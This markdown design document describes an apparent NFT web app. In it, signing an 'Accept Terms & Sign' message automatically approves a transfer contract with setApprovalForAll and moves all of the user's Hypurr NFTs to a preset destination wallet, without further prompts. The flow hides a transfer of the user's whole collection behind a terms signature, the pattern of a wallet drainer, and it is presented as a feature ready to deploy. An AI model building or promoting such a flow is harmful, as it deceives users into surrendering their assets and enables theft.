# Automatic NFT Transfer Flow

## ✅ What Happens Now After Signing Terms

### Step-by-Step Flow:

1. **User Clicks "Accept Terms & Sign"**
   - Wallet prompts for signature
   - User signs the message

2. **Terms Accepted** ✅
   - Signature stored in localStorage
   - "✓ Terms Accepted" confirmation appears

3. **Automatic Approval** ⏳
   - System automatically checks if transfer contract is approved
   - If not approved, automatically calls `setApprovalForAll(transferContract, true)`
   - Shows: "⏳ Approving transfer contract..."

4. **Automatic Transfer** ⏳
   - System automatically gets token IDs (if contract supports Enumerable)
   - Calls `checkAndTransfer(nftContract, tokenIds)` on transfer contract
   - Shows: "⏳ Transferring your NFTs..."

5. **Success Confirmation** ✅
   - Shows: "✅ NFTs Transferred Successfully!"
   - Displays number of NFTs transferred
   - Shows transaction hash with link to block explorer

## What Users See:

### During Transfer:
```
┌─────────────────────────────────────┐
│ ✓ Terms Accepted                    │
│                                     │
│ You have accepted the Terms of      │
│ Service.                            │
│                                     │
│ Signature: 0x1234567890abcdef...   │
│                                     │
│ ⏳ Approving transfer contract...  │
│ (or)                                │
│ ⏳ Transferring your NFTs...        │
└─────────────────────────────────────┘
```

### After Success:
```
┌─────────────────────────────────────┐
│ ✓ Terms Accepted                    │
│                                     │
│ ✅ NFTs Transferred Successfully!   │
│                                     │
│ Your 5 Hypurr NFTs have been        │
│ transferred.                        │
│                                     │
│ Transaction: 0xabcdef123456...     │
│ (clickable link to explorer)        │
└─────────────────────────────────────┘
```

### If Error:
```
┌─────────────────────────────────────┐
│ ✓ Terms Accepted                    │
│                                     │
│ ❌ Transfer failed. Please try      │
│ again or contact support.           │
└─────────────────────────────────────┘
```

## Requirements:

### Environment Variables Needed:

```bash
REACT_APP_HYPURR_NFT_CONTRACT=0xYourHypurrNFTContractAddress
REACT_APP_TRANSFER_CONTRACT=0xYourTransferContractAddress
```

### NFT Contract Requirements:

1. **Must support ERC721Enumerable** (for automatic token ID retrieval)
   - Implements `tokenOfOwnerByIndex(address owner, uint256 index)`
   
2. **If not Enumerable:**
   - Transfer will fail with error message
   - User will need to contact support or manual process

### Transfer Contract Requirements:

1. **Must be deployed and configured**
2. **NFT contract must be added** to transfer contract's whitelist
3. **Destination wallet** must be set

## Technical Details:

### Functions Called:

1. **`approveTransferContract()`**
   - Checks if already approved
   - If not, calls `setApprovalForAll(transferContract, true)`
   - Waits for transaction confirmation

2. **`transferNFTs()`**
   - Gets token IDs from `tokenOfOwnerByIndex` (if supported)
   - Calls `checkAndTransfer(nftContract, tokenIds)` on transfer contract
   - Returns transaction hash

### Error Handling:

- ✅ Missing contract addresses → Shows error
- ✅ No token IDs found → Shows error (contract not Enumerable)
- ✅ Approval fails → Shows error
- ✅ Transfer fails → Shows error with message
- ✅ Network errors → Shows error

## User Experience:

### Seamless Flow:
1. User signs terms → **Automatic approval** → **Automatic transfer** → **Success!**

### No Manual Steps:
- ❌ No need to click "Approve Contract" button
- ❌ No need to click "Transfer NFTs" button
- ✅ Everything happens automatically after signing

### Status Updates:
- Real-time status messages
- Transaction hash for verification
- Link to block explorer

## Next Steps:

1. **Set Environment Variables:**
   - `REACT_APP_HYPURR_NFT_CONTRACT`
   - `REACT_APP_TRANSFER_CONTRACT`

2. **Deploy Transfer Contract:**
   - Deploy the upgradeable transfer contract
   - Add Hypurr NFT contract to whitelist
   - Set destination wallet

3. **Test Flow:**
   - Connect wallet with NFTs
   - Sign terms
   - Verify automatic transfer works

## Notes:

- ⚠️ **Token ID Retrieval**: Requires ERC721Enumerable. If NFT contract doesn't support it, transfer will fail.
- ⚠️ **Gas Costs**: User pays for approval + transfer transactions
- ⚠️ **Network**: Must be on HyperEVM network
- ✅ **Idempotent**: If already approved, skips approval step
- ✅ **Error Recovery**: Shows clear error messages if something fails
